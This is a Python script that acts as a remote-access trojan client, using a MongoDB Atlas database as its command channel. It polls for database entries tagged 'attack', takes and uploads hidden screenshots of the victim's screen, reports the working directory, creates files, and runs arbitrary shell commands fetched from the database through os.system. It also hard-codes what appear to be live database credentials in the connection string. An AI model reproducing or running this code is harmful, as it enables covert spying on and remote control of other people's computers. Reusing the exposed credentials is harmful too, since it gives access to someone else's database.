from io import BytesIO
import os
from pymongo import MongoClient
from pymongo.server_api import ServerApi
from PIL import Image
import pyautogui
import gridfs

client = MongoClient("mongodb+srv://PaperCode:3aOqN02ZVrIvAaO3@kinetics.rtbhi4i.mongodb.net/?retryWrites=true&w"
                     "=majority", server_api=ServerApi('1'))

print(client.list_database_names())
command_base = client["command"]
data_conn = command_base["conn"]
p = [{"_id": "connect"}]
data_conn.insert_many(p)
data_base_contact = command_base["contact"]
data_base_img = command_base["img"]
data_base_cmd = command_base["cmd"]
fs = gridfs.GridFS(command_base)


def CreateFile(name):
    fp = open(name, "w+")
    fp.close()


def SendImageData():
    try:
        os.remove("image.jpg")
    except:
        pass
    image = pyautogui.screenshot()
    image.save("image.jpg")
    try:
        os.system("attrib +s +h image.jpg")
    except:
        pass
    with open("image.jpg", 'rb') as f:
        content = f.read()

    fs.delete(file_id="ss")

    fs.put(content, filename="file", _id="ss")


if __name__ == '__main__':
    while True:
        if data_base_img.count_documents({"_id": "attack", "info": "ss"}, limit=1) != 0:
            SendImageData()
            data_base_img.delete_many({"_id": "attack", "info": "ss"})

        elif data_base_cmd.count_documents({"info": "location"}, limit=1) != 0:
            print("foung")
            data_base_cmd.delete_many({"info": "location"})
            loc = os.getcwd()
            data = [{'info_r': 'location', 'loc': loc}]
            data_base_cmd.insert_many(data)

        elif data_base_cmd.count_documents({"attack_type": "cmd_use"}, limit=1) != 0:
            print("in Os")
            data = data_base_cmd.find({}, {"attack_type": "cmd_use", "cmd": 1})
            for data_ in data:
                print(data_["cmd"])
                os.system(data_['cmd'])
                data_base_cmd.delete_many({"attack_type": "cmd_use"})
                break

        elif data_base_contact.count_documents({"id": "attack", "info": "file_c"}, limit=1) != 0:
            data = data_base_contact.find({}, {"id": "attack", "info": "file_c", "name": 1})
            for data_ in data:
                CreateFile(data_['name'])
                data_base_contact.delete_many({"_id": "attack", "info": "ss"})
                break

# print(image_get)
# image_g = cv2.cvtColor(np.array(fs.get(file_id="ss")),
# cv2.COLOR_RGB2BGR)

# cv2.imwrite("image1.png", img)

# list = [{"_id": "0", "name": "UK", "IP":"Uk", "data": image}]

# conn.insert_many(list)

'''
image = cv2.cvtColor(np.array(image),
                     cv2.COLOR_RGB2BGR)

cv2.imwrite("image1.png", image)
'''
